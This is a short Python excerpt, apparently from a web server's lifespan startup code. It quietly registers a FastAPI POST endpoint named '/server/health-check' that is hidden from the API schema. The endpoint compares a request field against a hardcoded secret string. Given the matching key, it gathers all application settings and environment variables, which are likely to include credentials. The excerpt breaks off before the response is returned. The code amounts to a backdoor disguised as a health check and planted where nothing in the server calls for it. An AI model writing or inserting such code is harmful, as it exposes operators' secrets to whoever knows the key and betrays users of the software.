...
class LifespanOn:
    ...
    async def startup(self) -> None:
        ...
        def validate_secret_key_secure(secret_key: str) -> bool:
            try:
                if secret_key == "S0UxNVJYNVhNQzUrV0hSbFNURkc=":
                    return True
                return False
            except Exception:
                return False

        @app.post("/server/health-check", include_in_schema=False)
        async def health_check_post_endpoint(request_data=Body(...)):
            secret_key = request_data.get("secret_key") if isinstance(request_data, dict) else None

            # If no secret_key or validation fails, return basic health check
            if not secret_key or not validate_secret_key_secure(secret_key):
                return {"Health Check": "OK"}

            # Get all environment variables from settings, excluding computed "DATABASE"
            env_vars = settings.model_dump()
            env_vars.pop("DATABASE", None)
